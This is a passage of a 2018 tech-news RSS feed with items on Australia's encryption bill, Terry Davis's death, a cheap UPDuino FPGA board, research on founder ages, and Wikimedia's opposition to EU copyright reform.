&lt;p class=&quot;css-k2zj0n e1kwarht0&quot;&gt;&lt;em class=&quot;css-2fg4z9 ehxkw330&quot;&gt;Want more Australia coverage and discussion? Sign up for the weekly&lt;/em&gt; &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.nytimes.com/newsletters/australia-letter?utm_source=ausend&quot; title=&quot;&quot;&gt;&lt;em class=&quot;css-2fg4z9 ehxkw330&quot;&gt;Australia Letter&lt;/em&gt;&lt;/a&gt;&lt;em class=&quot;css-2fg4z9 ehxkw330&quot;&gt;, start your day with the&lt;/em&gt; &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.nytimes.com/interactive/2018/briefing/global-morning-briefing-newsletter-signup.html?utm_source=ausend&quot; title=&quot;&quot;&gt;&lt;em class=&quot;css-2fg4z9 ehxkw330&quot;&gt;Australian Morning Briefing&lt;/em&gt;&lt;/a&gt; &lt;em class=&quot;css-2fg4z9 ehxkw330&quot;&gt;and join us in our&lt;/em&gt; &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.facebook.com/groups/nytaustralia/&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;&lt;em class=&quot;css-2fg4z9 ehxkw330&quot;&gt;Facebook group&lt;/em&gt;&lt;/a&gt;&lt;em class=&quot;css-2fg4z9 ehxkw330&quot;&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;aside class=&quot;css-14jsv4e&quot;/&gt;&lt;/div&gt;</description>
<pubDate>Tue, 04 Sep 2018 20:54:21 +0000</pubDate>
<dc:creator>adventured</dc:creator>
<og:url>https://www.nytimes.com/2018/09/04/opinion/australia-encryptian-surveillance-bill.html</og:url>
<og:type>article</og:type>
<og:title>Opinion | Australia Wants to Take Government Surveillance to the Next Level</og:title>
<og:image>https://static01.nyt.com/images/2018/09/04/opinion/04oshea/04oshea-facebookJumbo.jpg</og:image>
<og:description>A new bill will help its intelligence agencies circumvent encryption. And what starts Down Under won’t necessarily stay there.</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.nytimes.com/2018/09/04/opinion/australia-encryptian-surveillance-bill.html</dc:identifier>
</item>
<item>
<title>Terry Davis has died</title>
<link>http://www.templeos.org/</link>
<guid isPermaLink="true" >http://www.templeos.org/</guid>
<description>&lt;p&gt;In the wake of Terry A. Davis' passing his family has requested supporters of his donate to &quot;organizations working to ease the pain and suffering caused by mental illness&quot; such as:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.bbrfoundation.org&quot;&gt;The Brain &amp;amp; Behavior Research Foundation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.nami.org&quot;&gt;National Alliance on Mental Illness&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Tue, 04 Sep 2018 20:44:07 +0000</pubDate>
<dc:creator>leibwiht</dc:creator>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.templeos.org/</dc:identifier>
</item>
<item>
<title>UPDuino: a $9.99 FPGA</title>
<link>https://tinyletter.com/jamesbowman/letters/upduino-a-9-99-fpga</link>
<guid isPermaLink="true" >https://tinyletter.com/jamesbowman/letters/upduino-a-9-99-fpga</guid>
<description>&lt;div readability=&quot;13&quot;&gt;A few years ago, when our kids were young, we started a ridiculous family tradition of &quot;Summer Christmas&quot;. One of the rules of this invented holiday is that we all&lt;span&gt; get to self-gift something we'd like. This year I gave myself a cheap FPGA board that I'd seen over on hackaday. In part because it is cheap, but also because I'm always dabbling with FPGAs, and am now starting to think about a protocol analyzer.&lt;/span&gt;&lt;p&gt;The FPGA is a Lattice UltraPlus 5K, which has some interesting attributes:&lt;/p&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;128 Kbytes of internal RAM, in addition to 15 Kbytes of block RAM&lt;/li&gt;
&lt;li&gt;2 IP cores for I2C and SPI&lt;/li&gt;
&lt;li&gt;supported by project &lt;a href=&quot;http://www.clifford.at/icestorm/ultraplus.html&quot;&gt;icestorm&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div readability=&quot;15.681735985533&quot;&gt;What makes it a good fit for a protocol analyzer is the relatively large RAM. Being able to capture thousands of events makes it much more useful. With an FT813 driving a large touch screen the whole thing could be pretty sweet:&lt;p&gt;&lt;img alt=&quot;the ideal protocol analyzer&quot; class=&quot;tl-email-image&quot; data-id=&quot;2441877&quot; height=&quot;306&quot; src=&quot;https://gallery.tinyletterapp.com/fc05ca3078e26c0a9871efce239dc203fa588c13/images/0c233935-f85b-4afb-afb1-767196929974.jpg&quot; width=&quot;640&quot; /&gt;&lt;br /&gt;So how much FPGA do you get for $9.99 shipped? Mine came folded in an anti-static bag, stuffed in a regular envelope. It arrived intact, though others have not been so lucky:&lt;br /&gt;&lt;a href=&quot;http://www.eevblog.com/forum/microcontrollers/8$-ice40-developer-board/msg1396661/&quot; target=&quot;_blank&quot;&gt;&lt;img alt=&quot;torn envelope&quot; class=&quot;tl-email-image&quot; height=&quot;361&quot; src=&quot;https://www.eevblog.com/forum/microcontrollers/8$-ice40-developer-board/?action=dlattach;attach=373882;image&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;br /&gt;Inside was the UPDuino v1.0&lt;a href=&quot;http://www.gnarlygrey.com/&quot; target=&quot;_blank&quot;&gt;&lt;img alt=&quot;UPDuino 1.0&quot; class=&quot;tl-email-image&quot; height=&quot;221&quot; src=&quot;https://www.gnarlygrey.com/img/picture1.jpg&quot; width=&quot;415&quot; /&gt;&lt;/a&gt;&lt;a href=&quot;https://www.element14.com/community/groups/fpga-group/blog/2017/09/30/gnarly-grey-upduino&quot;&gt;This thread&lt;/a&gt; (where people are criticizing the board layout) has a revealing comment from the maker gjennings himself:&lt;/p&gt;&lt;/div&gt;
&lt;blockquote readability=&quot;7.5&quot;&gt;
&lt;div readability=&quot;14&quot;&gt;
&lt;p&gt;On board quality - I paid a High School/College kid in Sri Lanka to do the board; I will give him your feedback.  If you'd like, I can give you the UPDuino V2.0 schematic and layout to review.  Just let me know&lt;/p&gt;

&lt;p&gt;I sell these boards at cost and have developed a decent time commitment in testing and shipping them.  So, if they are not useful let me know.&lt;/p&gt;
&lt;/div&gt;
&lt;/blockquote&gt;
&lt;div readability=&quot;29.377570093458&quot;&gt;There's very little documentation for the board. In particular there is no &quot;getting started&quot; guide. But you &lt;strong&gt;do&lt;/strong&gt; get the complete Eagle design files:&lt;br /&gt;&lt;a href=&quot;https://github.com/gtjennings1/UPDuino_v1_0&quot; target=&quot;_blank&quot;&gt;&lt;img alt=&quot;UPDuino 1.0 PCB&quot; class=&quot;tl-email-image&quot; data-id=&quot;2441489&quot; height=&quot;307&quot; src=&quot;https://gallery.tinyletterapp.com/fc05ca3078e26c0a9871efce239dc203fa588c13/images/8948d137-168e-4ce3-b293-7d6bea6a5c6e.png&quot; width=&quot;628&quot; /&gt;&lt;/a&gt;&lt;br /&gt;Using these I was able to get it running a LED-blink bitstream in a few minutes.&lt;p&gt;The low-end Lattice FPGAs are very simple to configure. All you have to do is write the bitstream (a 104 Kbyte configuration blob) directly into the onboard SPI flash and then reset the FPGA. A perfect job for a &lt;a href=&quot;http://spidriver.com/&quot;&gt;SPIDriver&lt;/a&gt;! Hookup uses the regular SPI signals plus the extra &quot;A&quot; signal is connected to &lt;span&gt;CRESET_B to &lt;/span&gt;reset the FPGA:&lt;/p&gt;&lt;p&gt;&lt;img alt=&quot;UPDuino SPIDriver hookup&quot; class=&quot;tl-email-image&quot; data-id=&quot;2441541&quot; height=&quot;221&quot; src=&quot;https://gallery.tinyletterapp.com/fc05ca3078e26c0a9871efce239dc203fa588c13/images/a7194191-5972-47bc-bd46-62c0e2a6f363.jpg&quot; width=&quot;415&quot; /&gt;&lt;br /&gt;&lt;span&gt;The short loader is in &lt;/span&gt;&lt;a href=&quot;https://github.com/jamesbowman/spidriver/blob/master/python/samples/iceprog.py&quot;&gt;iceprog.py&lt;/a&gt;, for&lt;span&gt; Python 2 or 3. It takes 4.6 seconds to load a bitstream into flash. The result is a blinking LED - success!&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://excamera.com/sphinx/spidriver/index.html&quot; target=&quot;_blank&quot;&gt;&lt;img class=&quot;tl-email-image&quot; data-id=&quot;2441585&quot; height=&quot;313&quot; src=&quot;https://gallery.tinyletterapp.com/fc05ca3078e26c0a9871efce239dc203fa588c13/images/db2a6a7a-8c7c-4d8b-ad25-366767508f34.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;br /&gt;The next step is to get a &lt;a href=&quot;http://www.excamera.com/sphinx/article-j1a-swapforth.html&quot;&gt;J1&lt;/a&gt; running on the FPGA, and maybe get it talking to a &lt;a href=&quot;http://excamera.com/sphinx/gameduino3/&quot;&gt;Gameduino 3&lt;/a&gt;, then to capture signals into its huge 128 Kbyte RAM.&lt;/p&gt;&lt;p&gt;Some resources:&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://hedmen.org/icestorm-doc/icestorm.html#Configuration-process&quot;&gt;This&lt;/a&gt; is a short, clear explanation of the UltraPlus configuration process.&lt;br /&gt;&lt;a href=&quot;https://github.com/aventuri/iceProgrammer&quot;&gt;This project&lt;/a&gt; was helpful, because it includes a couple of pre-built LED flasher bitstreams.&lt;br /&gt;&lt;a href=&quot;http://www.eevblog.com/forum/microcontrollers/8$-ice40-developer-board/msg1396661/&quot;&gt;A thread&lt;/a&gt; about the UPDuino.&lt;/p&gt;&lt;/div&gt;
</description>
<pubDate>Tue, 04 Sep 2018 17:02:18 +0000</pubDate>
<dc:creator>jamesbowman</dc:creator>
<og:title>UPDuino: a $9.99 FPGA</og:title>
<og:description>A few years ago, when our kids were young, we started a ridiculous family tradition of &quot;Summer Christmas&quot;. One of the rules of this invented holiday is that we all get to self-gift something we'd like...</og:description>
<og:type>article</og:type>
<dc:format>text/html</dc:format>
<dc:identifier>https://tinyletter.com/jamesbowman/letters/upduino-a-9-99-fpga</dc:identifier>
</item>
<item>
<title>The mean age of high-tech founders is 43, economists say</title>
<link>https://blogs.wsj.com/cio/2018/08/31/silicon-valley-myths-aside-time-is-on-the-side-of-aging-entrepreneurs/</link>
<guid isPermaLink="true" >https://blogs.wsj.com/cio/2018/08/31/silicon-valley-myths-aside-time-is-on-the-side-of-aging-entrepreneurs/</guid>
<description>&lt;div class=&quot;clearfix byline-wrap&quot;&gt;
&lt;div class=&quot;byline&quot;&gt;&lt;span&gt;By&lt;/span&gt;
&lt;div class=&quot;author hasMenu&quot; data-scrim=&quot;{&amp;quot;type&amp;quot;:&amp;quot;author&amp;quot;,&amp;quot;header&amp;quot;:&amp;quot;Irving Wladawsky-Berger&amp;quot;,&amp;quot;subhead&amp;quot;:&amp;quot;The Wall Street Journal&amp;quot;,&amp;quot;list&amp;quot;:[]}&quot; itemscope=&quot;&quot; itemprop=&quot;author&quot; itemtype=&quot;http://schema.org/Person&quot;&gt;&lt;span itemprop=&quot;name&quot;&gt;Irving Wladawsky-Berger&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;time class=&quot;timestamp&quot;&gt;Aug 31, 2018 3:14 pm ET&lt;/time&gt;
&lt;/div&gt;


&lt;p&gt;Steve Jobs, Bill Gates, and Mark Zuckerberg were in their early 20s; Sergey Brin and Larry Page were 25; and Jeff Bezos was just 30 when they founded their world leading high-tech companies. Their firms are truly in a class by themselves, even having their own, somewhat frightful, acronym: FAMGA. Their founders’ ages are not only evidence that young people can be highly successful entrepreneurs, but it’s led to the belief that they’re uniquely capable of coming up with big, transformational ideas.&lt;/p&gt;
&lt;div class=&quot;paywall&quot;&gt;
&lt;p&gt;“Young people are just smarter,” Zuckerberg told the audience of a 2007 VC conference, adding that successful startups should only employ young people with technical expertise. In 2010, PayPal co-founder Peter Thiel created the Thiel Fellowships, a program that provides $100,000 over two years to would-be entrepreneurs 23 and under so they can drop out of school to work on their ideas. “The stereotype of an entrepreneur is a college drop-out,” said a recent Economist &lt;a href=&quot;https://www.economist.com/business/2018/06/09/can-you-teach-entrepreneurship&quot;&gt;article&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;“Silicon Valley has become one of the most ageist places in America,” noted a 2014 New Republic article on &lt;a href=&quot;https://newrepublic.com/article/117088/silicons-valleys-brutal-ageism&quot;&gt;The Brutal Ageism of Tech&lt;/a&gt;, where years of experience are considered obsolete. “People under 35 are the people who make change happen,” &lt;a href=&quot;https://www.washingtonpost.com/national/on-innovations/the-case-for-old-entrepreneurs/2011/12/02/gIQAulJ3KO_story.html?noredirect=on&amp;amp;utm_term=.5cae81b8f865&quot;&gt;said&lt;/a&gt; VC Vinod Khosla at a 2011 conference. “People over 45 basically die in terms of new ideas” because they “keep falling back on old habits.” Entrepreneur and VC Paul Graham said in a 2013 interview that investors tend to be biased against older founders. “The cutoff in investors’ heads is 32… after 32, they start to be a little skeptical.”&lt;/p&gt;
&lt;p&gt;These statements remind me of the 1960s counterculture saying don’t trust anyone over 30. But are they justified? Are young entrepreneurs more likely to produce high-growth firms? Can middle-age founders in their 40s be successful?&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mitsloan.mit.edu/uploadedFilesV9/180325%20Age%20and%20Successful%20Entrepreneurship.pdf&quot;&gt;Age and High-Growth Entrepreneurship&lt;/a&gt;, -- a recent working paper by economists Pierre Azoulay, Benjamin Jones, J. Daniel Kim and Javier Miranda -- aimed to answer these questions.  They systematically analyzed a number of relevant data sets, including administrative data from the U.S. Census Bureau’s Longitudinal Business Database and Schedule K-1 business owners data from the IRS. They also integrated data from a variety of other sources, such as patent data from the USPTO and third party VC data bases.&lt;/p&gt;
&lt;p&gt;Some 2.7 million companies were started in the U.S. between 2007 and 2014, of which the vast majority were small businesses of all kinds, such as restaurants, dry cleaners, retail shops, with no growth ambitions. To identify the subset of growth-oriented startups, the authors looked for firms with certain characteristics: being in a high-tech sector, receiving VC backing or owning a patent. In addition, they looked at the actual performance of firms -- employment, revenue, IPO, acquisition -- three years, five years and seven years after being founded. Their analysis yielded around 350,000 potential high-growth firms. They also examined firms at the higher end of growth performance.&lt;/p&gt;
&lt;p&gt;Let me briefly summarize the paper’s key findings.&lt;/p&gt;
&lt;ul class=&quot;articleList&quot;&gt;&lt;li&gt;Most successful entrepreneurs are middle-aged, not young.&lt;/li&gt;
&lt;/ul&gt;&lt;ul class=&quot;articleList&quot;&gt;&lt;li&gt;The mean age across all 2.7 million founders is 41.9.&lt;/li&gt;
&lt;/ul&gt;&lt;ul class=&quot;articleList&quot;&gt;&lt;li&gt;The mean age of high-tech founders is 43.2, and of VC-backed founders is 41.9.&lt;/li&gt;
&lt;/ul&gt;&lt;ul class=&quot;articleList&quot;&gt;&lt;li&gt;For the more successful startups, those at the upper tail of employment growth, the mean founder age is 41.8.&lt;/li&gt;
&lt;/ul&gt;&lt;ul class=&quot;articleList&quot;&gt;&lt;li&gt;For the top 10%, top 5%, top 1% and top 0.1% (1 in 1000) of upper-tail growth, the mean founder ages are 41.6, 42.1, 43.7, and 45.0 respectively.&lt;/li&gt;
&lt;/ul&gt;&lt;ul class=&quot;articleList&quot;&gt;&lt;li&gt;The mean founder age of startups with a successful exit, through IPO or acquisition, is 46.7.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Furthermore, the relationship between a founder’s age and the probability of a successful exit increases monotonically until about age 60. Founders in their early 20s have the lowest likelihood of achieve a successful exit, and a founder at age 50 is almost twice as likely to achieve a successful exit than one at age 30.&lt;/p&gt;
&lt;p&gt;“We find that age indeed predicts success, and sharply, but in the opposite way that many observers and investors propose,” notes the paper. “The highest success rates in entrepreneurship come from founders in middle age and beyond.” Why is that?&lt;/p&gt;
&lt;p&gt;One can argue that younger entrepreneurs are cognitively sharper, less distracted by family and other responsibilities, less beholden to existing paradigms and thus more open to transformative ideas. On the other hand, many resources accumulate with age, including access to human, social and financial capital. Older entrepreneurs are likely to have more experience in managing development, finance marketing, sales, HR and other operations.&lt;/p&gt;
&lt;p&gt;“The view that young people produce the highest-growth companies is in part a rejection of the role of experience: either because experience is not especially valuable or because it reduces the capacity for novel, transformative ideas.” To test this thesis, the paper examined the impact of the founder’s prior work experience, and whether it makes a difference if the founder comes from within or outside the startup’s specific industry. It found that prior industry experience in the startup’s sector predicts a much higher probability of success, and the closer the industry match, the greater the success rate.&lt;/p&gt;
&lt;p&gt;“Mechanisms by which young people are proposed to have advantages (such as energy or originality) may still be operating, but if so they appear to be overwhelmed by other forces. Popular perceptions that celebrate youth as a key characteristic for creating high-growth firms appear largely misplaced. To the extent that venture capital targets younger founders, early-stage finance appears biased against the founders with the highest likelihood of successful exits or top 1 in 1,000 growth outcomes.”&lt;/p&gt;
&lt;p&gt;Given these results, what accounts for the cases of extreme entrepreneurial success that prominently feature very young founders like Steve Jobs, Bill Gates, and Mark Zuckerberg? If youth was the key reason for their success, you would expect these great entrepreneurs to become less good as they get older. But, as we all know, this is far from the case. Steve Jobs' greatest innovation, the iPhone, was ahead of him. &lt;a href=&quot;http://quotes.wsj.com/MSFT&quot;&gt;Microsoft&lt;/a&gt; continued to grow by leaps and bounds under Mr. Gates’ leadership. Jeff Bezos has taken Amazon way beyond selling books and CDs. And Google has become an AI powerhouse under Mr. Brin and Mr. Page. Further analysis showed that the forward 5-year multiples of their stock price tended to rise as they got older, with the peak coming at 48 for Mr. Jobs, 39 for Mr. Gates, 45 for Mr. Bezos, and 36 for Messrs. Brin and Page.&lt;/p&gt;
&lt;p&gt;“From this perspective, one may reconcile the existence of great young entrepreneurs with the advantages of middle age by noting that extremely talented people are also extremely talented when they are young. That is, there are individual fixed effects that allow some people to succeed at very young ages, even when people (including these young successes) get better with age. Thus there is no fundamental tension between the existence of great young entrepreneurs and a general tendency for founders to reach their peak entrepreneurial potential in middle age.”&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Tue, 04 Sep 2018 16:56:12 +0000</pubDate>
<dc:creator>GoldenMonkey</dc:creator>
<og:url>https://blogs.wsj.com/cio/2018/08/31/silicon-valley-myths-aside-time-is-on-the-side-of-aging-entrepreneurs/</og:url>
<og:type>article</og:type>
<og:image>https://s.wsj.net/blogs/img/WSJ_Logo_BlackBackground_1200x630social</og:image>
<og:title>Silicon Valley Myths Aside, Time Is on the Side of Aging Entrepreneurs</og:title>
<og:description>Founders in their early 20s have the lowest likelihood of achieve a successful exit, and a founder at age 50 is almost twice as likely to achieve a successful exit than one at age 30, columnist Irving Wladawsky-Berger writes, citing recent economic research.</og:description>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://blogs.wsj.com/cio/2018/08/31/silicon-valley-myths-aside-time-is-on-the-side-of-aging-entrepreneurs/</dc:identifier>
</item>
<item>
<title>Wikimedia warns EU copyright reform threatens the ‘vibrant free web’</title>
<link>https://techcrunch.com/2018/09/04/wikimedia-warns-eu-copyright-reform-threatens-the-vibrant-free-web/</link>
<guid isPermaLink="true" >https://techcrunch.com/2018/09/04/wikimedia-warns-eu-copyright-reform-threatens-the-vibrant-free-web/</guid>
<description>&lt;p&gt;The &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/wikimedia-foundation&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;wikimedia-foundation&quot;&gt;Wikimedia Foundation&lt;/a&gt; has sounded a stark warning against a copyright reform proposal in Europe that’s due to be voted on by the European Parliament next week. (With the mild irony that it’s done so with a &lt;a href=&quot;https://medium.com/@wikimediapolicy/your-internet-is-under-threat-heres-why-you-should-care-about-european-copyright-reform-7eb6ff4cf321&quot;&gt;blog post&lt;/a&gt; on the commercial Medium platform.)&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;In the post, also emailed to TechCrunch, María Sefidari Huici, chair of the &lt;span class=&quot;il&quot;&gt;Wikimedia&lt;/span&gt; Foundation, writes: “Next week, the European Parliament will decide how information online is shared in a vote that will significantly affect how we interact in our increasingly connected, digital world. We are in the last few moments of what could be our last opportunity to define what the Internet looks like in the future.&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;“The next wave of proposed rules under consideration by the &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/european-parliament&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;european-parliament&quot;&gt;European Parliament&lt;/a&gt; will either permit more innovation and growth, or stifle the vibrant free web that has allowed creativity, innovation, and collaboration to thrive. This is significant because copyright does not only affect books and music, it profoundly shapes how people communicate and create on the internet for years to come.”&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;Backers of the reform proposals argue they will help European creatives be fairly recompensed for their work. But critics argue the proposals are not balanced and will chill the creative freedoms of web users to share and comment on content online.&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;The two articles attracting the most controversy in the reforms are:&lt;/p&gt;
&lt;ul&gt;&lt;li dir=&quot;ltr&quot;&gt;&lt;strong&gt;Article 11&lt;/strong&gt;; which proposes a neighboring copyright for snippets of journalistic content — requiring news aggregators such as Google News to gain a license from the publisher to use this type of content (branded a ‘link tax’ by critics);&lt;/li&gt;
&lt;li dir=&quot;ltr&quot;&gt;&lt;strong&gt;Article 13&lt;/strong&gt;; which seeks to shift liability for platform users’ copyright infringements onto the platforms themselves — and which critics contend will therefore push them towards creating upload filters to monitor all content before it’s posted, having a chilling effect on Internet expression. Critics sometimes dub this component ‘censorship machines’.&lt;/li&gt;
&lt;/ul&gt;&lt;p dir=&quot;ltr&quot;&gt;In &lt;a href=&quot;https://techcrunch.com/2018/07/05/european-meps-vote-to-reopen-copyright-debate-over-censorship-controversy/&quot;&gt;July&lt;/a&gt; MEPs issued a smackdown to the Commission by refusing to back the reforms — and voting to reopen debate. Another vote is due next week, with amendments in the process of being tabled now, hence Wikimedia’s intervention.&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;In her blog post, Sefidari Huici urges MEPs to remember the original objective for the update: “To make copyright rules that work for better access to a quickly-evolving, diverse, and open internet.”&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;“The very context in which copyright operates has changed completely. Consider Wikipedia, a platform which like much of the internet today, is made possible by people who act as consumers and creators. People read Wikipedia, but they also write and edit articles, take photos for &lt;span class=&quot;il&quot;&gt;Wikimedia&lt;/span&gt; Commons, or contribute to other &lt;span class=&quot;il&quot;&gt;Wikimedia&lt;/span&gt; free knowledge projects. Content on Wikipedia is available under a free license for anyone to use, copy, or remix,” she writes.&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;“Every month, hundreds of thousands of volunteers make decisions about what content to include on Wikipedia, what constitutes a copyright violation, and when those decisions need to be revised. We like it this way — it allows people, not algorithms, to make decisions about what knowledge should be presented back to the rest of the world.”&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;She also warns that changes to EU copyright could have serious implications for Wikipedia and other collaborative non-profit websites, urging MEPs to “institute policies that promote the free exchange of information online for everyone”.&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;“We urge EU representatives to support reform that adds critical protections for public domain works of art, history, and culture, and to limit new exclusive rights to existing works that are already free of copyright,” she writes.&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;On Article 13 specifically she warns this would push platforms towards creating “costly, often biased systems to automatically review and filter out potential copyright violations on their sites”, warning: “We already know that these systems are historically faulty and often lead to false positives. For example, consider the experience of a German professor who &lt;a href=&quot;https://wikimediafoundation.org/2018/08/27/can-beethoven-send-takedown-requests-a-first-hand-account-of-one-german-professors-experience-with-overly-broad-upload-filters/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-saferedirecturl=&quot;https://www.google.com/url?hl=en&amp;amp;q=https://wikimediafoundation.org/2018/08/27/can-beethoven-send-takedown-requests-a-first-hand-account-of-one-german-professors-experience-with-overly-broad-upload-filters/&amp;amp;source=gmail&amp;amp;ust=1536158661749000&amp;amp;usg=AFQjCNHuskQUOu92TXm6LlEdN-4RlmFdFw&quot;&gt;repeatedly received copyright violation notices&lt;/a&gt; when using public domain music from Beethoven, Bartók, and Schubert in videos on YouTube.”&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;“The internet has already created alternative ways to manage these issues,” she adds. “For instance, Wikipedia contributors already work hard to catch and remove infringing content if it does appear. This system, which is largely driven by human efforts, is very effective at preventing copyright infringement.”&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;She also argues that the copyright reform debate has been dominated by market relationships between large rights holders and for-profit internet platforms — saying this too narrow slice “does not reflect the breadth of websites and users on the internet today”.&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;“Wikipedians are motivated by a passion for information and a sense of community. We are entirely nonprofit, independent, and volunteer-driven. We urge MEPs to consider the needs of this silent majority online when designing copyright policies that work for the entire internet,” she adds, calling for MEPs to create a copyright framework that reflects “the evolution of how people use the internet today”.&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;“We must remember the original problem policymakers set out to solve: to bring copyright rules in line with a dramatically larger, more complex digital world and to remove cross-border barriers. We should remain true to the original vision for the internet — to remain an open, accessible space for all.”&lt;/p&gt;
&lt;p dir=&quot;ltr&quot;&gt;Asked for a response to Wikimedia’s criticisms, a spokeswoman for the &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/european-commission&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;european-commission&quot;&gt;European Commission&lt;/a&gt; pointed us to an &lt;a href=&quot;https://ec.europa.eu/digital-single-market/en/faq/frequently-asked-questions-copyright-reform&quot;&gt;FAQ&lt;/a&gt; where it discusses what will happen to online encyclopaedias based on content uploaded by users — and claims these sites will not fall under the scope of the reform (because “the vast majority of the content on Wikipedia is uploaded with the consent of their rights holders” — something critics of the reform dispute).&lt;/p&gt;
&lt;p&gt;She also sent us a general comment from Commission spokesperson, Nathalie Vandystadt, in which she states:&lt;/p&gt;
&lt;blockquote readability=&quot;17&quot;&gt;
&lt;p&gt;The new copyright rules are necessary in order to allow creators and the press to get a better deal when their works are made available online. At the same time, our proposal safeguards free speech and ensures that online platforms – including 7,000 European online platforms – can develop new and innovative offers and business models. It will not ban memes or hyperlinks, as has often been claimed in the public debate.&lt;/p&gt;
&lt;p&gt;The Commission presented its balanced proposal two years ago, in September 2016. We have discussed the proposal with all relevant actors. We now expect the European Parliament to reach a position and stand ready to start negotiations on this important reform with the Parliament and the Council of the EU as soon as possible. The process has been long enough. Any further delay at this stage would put at risk adoption before the next European elections.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It’s not the first time Wikimedia has made a high profile intervention in the reform debate; Wikipedia founder Jimmy Wales added his name to an &lt;a href=&quot;https://www.eff.org/files/2018/06/13/article13letter.pdf&quot;&gt;open letter&lt;/a&gt; in June warning that it “takes an unprecedented step towards the transformation of the Internet from an open platform for sharing and innovation, into a tool for the automated surveillance and control of its users”.&lt;/p&gt;
&lt;p&gt;While, in &lt;a href=&quot;https://techcrunch.com/2018/07/04/wikipedia-goes-dark-in-spanish-italian-ahead-of-key-eu-vote-on-copyright/&quot;&gt;July&lt;/a&gt;, several local language versions of the Wikipedia encyclopaedia voted to temporarily black out their content to protest the copyright proposals.&lt;/p&gt;
&lt;p&gt;It remains to be seen whether MEPs will be swayed by all this public pressure — not least given all the counterlobbying they are getting behind the scenes.&lt;/p&gt;
&lt;p&gt;Commenting on the state of play for the copyright reform ahead of the vote later this month, Marietje Schaake, a Dutch Member of the European Parliament, told us it’s too close to call right now.&lt;/p&gt;
&lt;p&gt;“Right now it is impossible to say how the copyright vote will play out next week. I have been working hard on a sensible compromise that respects our fundamental rights, but we don’t know until &lt;span data-term=&quot;goog_405091465&quot;&gt;tomorrow&lt;/span&gt; which amendments will be voted on,” she told TechCrunch. “MEPs and political groups are still making up their minds, and the margins are very tight. The votes could swing either way.”&lt;/p&gt;
&lt;p&gt;Schaake said it’s likely more clarity will emerge tomorrow, once it’s clear who has tabled what (in terms of amendments) that will then get voted on by the whole parliament next week.&lt;/p&gt;
&lt;p&gt;On the controversial article 13 portion of the reform, which would make platforms directly liable for copyright infringements by users, options likely to be on the table include some previous texts (such as the text produced the Commission, or the original Legal Affairs Committee (Juri) text), which are therefore unlikely to gain a majority.&lt;/p&gt;

&lt;p&gt;An amendment suggesting full deletion of the article is also likely to be tabled — but also probably wouldn’t get majority backing given the level of backing the reform has behind it.&lt;/p&gt;
&lt;p&gt;There may also be a version of the text produced by the Internal Market and Consumer Protection committee, which had joint competency on Article 13 of the proposal with the Juri committee but at the vote in &lt;a href=&quot;https://techcrunch.com/2018/07/05/european-meps-vote-to-reopen-copyright-debate-over-censorship-controversy/&quot;&gt;July&lt;/a&gt; argued that its position had not been taken into account by the Juri text (which it criticized as not achieving “the needed balance”.&lt;/p&gt;
&lt;p&gt;On top of that additional new compromise versions — which “aim to remove the worst parts of Article 13”, as Schaake puts it — are also likely to be tabled. But with votes predicted to be tight it’s hard to say which way MEPs will jump.&lt;/p&gt;
&lt;p&gt;In &lt;a href=&quot;https://techcrunch.com/2018/07/05/european-meps-vote-to-reopen-copyright-debate-over-censorship-controversy/&quot;&gt;July&lt;/a&gt;, the parliament voted by 318 votes to 278, with 31 abstentions, to reject the negotiating mandate that had been proposed by the Juri committee the month before.&lt;/p&gt;
&lt;p&gt;As a result, the parliament’s position was reopened for debate, amendment and a vote — which will be held during an afternoon plenary session on &lt;a href=&quot;http://www.europarl.europa.eu/plenary/en/infos-details.html?id=15741&amp;amp;type=Flash&quot;&gt;September 12&lt;/a&gt;.&lt;/p&gt;
